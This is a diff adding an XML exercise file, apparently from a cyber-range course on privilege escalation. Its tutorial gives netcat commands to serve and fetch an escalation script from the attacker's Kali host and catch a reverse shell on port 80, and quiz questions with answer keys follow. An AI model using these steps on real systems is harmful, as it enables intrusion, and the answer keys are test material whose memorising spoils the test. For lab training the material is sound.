@@ -1,0 +1,47 @@
+<?xml version="1.0"?>
+<exercises>
+  <exercise>
+    <title>Privilege Escalation</title>
+    <difficulty>2</difficulty>
+    <category>CNE</category>
+    <name>priv_esc</name>
+    <dependencies>netcat</dependencies>
+    <shortdescription>Privilege Escalation</shortdescription>
+    <description>Privilege Escalation</description>
+    <tutorial>&lt;p&gt;Priviledge Escalation Script&lt;/p&gt;&#xD;
+&lt;ol&gt;&#xD;
+&lt;li&gt;Exploit a target with user level priviledges (spear phishing, etc)&lt;/li&gt;&#xD;
+&lt;li&gt;Make sure netcat (nc.exe) is on the target computer from a previous exercise. Run "ls /mnt/share" on your Kali session. If /mnt/share on your Kali box is empty, run the following commands (or run the script on /root/Desktop): service rpcbind start service nfs-common start mount -t nfs DC:/ShareFiles /mnt/share&lt;/li&gt;&#xD;
+&lt;li&gt;Choose a random high port touse for uploading our custom priviledge escalation script (something like 14920). Use the following syntax on your kali box: cat /mnt/share/y_resources/esc/esc.vbe| nc -v -l -p&lt;/li&gt;&#xD;
+&lt;li&gt;Use the following syntax on your target machine. &lt;strong&gt;BE SURE TO PLACE THIS SCRIPT IN THE SAME FOLDER AS&lt;/strong&gt; nc.exe nc -v -w 30 192.20.128.11 &amp;gt; esc.vbe&lt;/li&gt;&#xD;
+&lt;li&gt;Wait a long time, it is uploading your script, press return every few seconds on the target machine.&lt;/li&gt;&#xD;
+&lt;li&gt;Open another netcat listener on your kali machine on port 80&lt;/li&gt;&#xD;
+&lt;li&gt;Execute the priviledge escalation script esc.vbe on the target machine and you will return an elevated shell to your open listener.&lt;/li&gt;&#xD;
+&lt;li&gt;Hack&lt;/li&gt;&#xD;
+&lt;/ol&gt;</tutorial>
+    <question>
+      <text>After you gained a privileged shell, what GROUP(S) were you a member of?</text>
+      <type>multiple</type>
+      <answer>Administrators, Domain Admins, Enterprise Admins, Group Policy Creator, Schema Admins, Domain Users</answer>
+      <wrong>administrator</wrong>
+      <wrong>defense\administrator</wrong>
+      <wrong>Domain Users, Domain Admins, Certificate Issuers</wrong>
+    </question>
+    <question>
+      <text>Which of the following options is FALSE regarding the role of a Domain Admin?</text>
+      <type>multiple</type>
+      <answer>Domain Admins are Administrators of the domain, but do not have Administrative rights on local computers</answer>
+      <wrong>"Domain Admins" is a special built in Active Directory group that contains users who are able to virtually perform any privileged operation throughout a domain</wrong>
+      <wrong>Domain Admins a do not have privileges over an entire forest or over trust relationships, just within a domain</wrong>
+      <wrong>Domain Admin accounts can be used to create group policy objects</wrong>
+    </question>
+    <question>
+      <text>During this exercise, what privileges do you start with and what privileges do you gain?</text>
+      <type>multiple</type>
+      <answer>Started with user privileges, ended up with Administrator privileges</answer>
+      <wrong>Started with user privileges, ended up with SYSTEM level privileges</wrong>
+      <wrong>Started with Administrator privileges, ended up with SYSTEM level privileges</wrong>
+      <wrong>Started with Administrator privileges, ended up with user privileges</wrong>
+    </question>
+  </exercise>
+</exercises>
